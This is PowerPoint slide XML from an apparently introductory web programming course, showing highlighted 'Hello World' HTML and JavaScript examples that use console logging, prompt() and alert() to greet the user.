              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B06090202040302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47B2369-126C-49CC-AE56-141E6FE12459}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Hello Console World </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BCF9AA7C-AAB4-4CE8-BF13-444B8A9C112F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;!DOCTYPE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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&lt;html&gt;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&lt;head&gt;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&lt;meta</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>charset</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"utf-8"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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&lt;title&gt;&lt;/title&gt;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&lt;meta</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</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"viewport"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>content</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"width=device-width, initial-scale=1"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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&lt;/head&gt;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&lt;body&gt;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&lt;h1&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Debug</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/h1&gt;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only visible in console (F12), useful for debugging</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"Hello world!"</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&lt;/body&gt;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&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr lang="en-US" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3615398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tsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{57C15C3C-43E5-438F-8CD6-C4AB60642E3E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Interactive Hello World</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6A3EA356-30EA-49F2-8646-88D465D167F2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="55000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;!DOCTYPE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>html</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800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;html&gt;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head</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meta</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>charset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"utf-8"</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title</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>title</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meta</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>viewport</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>content</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>device-width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>initial-scale</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=1"</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head</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body</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script</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NOT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>recommended</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annoying</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> on mobile </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>devices</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" b="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="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name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>prompt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>What</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>your</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>?"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>""</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err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Hello</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"!"</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script</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800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>body</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B06090202040302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E8509DF-F670-417B-9D28-2287B88A4631}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Better Interactive Hello World</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19459" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4EA8F6BD-E1D5-4022-A2BF-05CD56EBB536}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="638175" y="1196975"/>
            <a:ext cx="10972800" cy="5545138"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
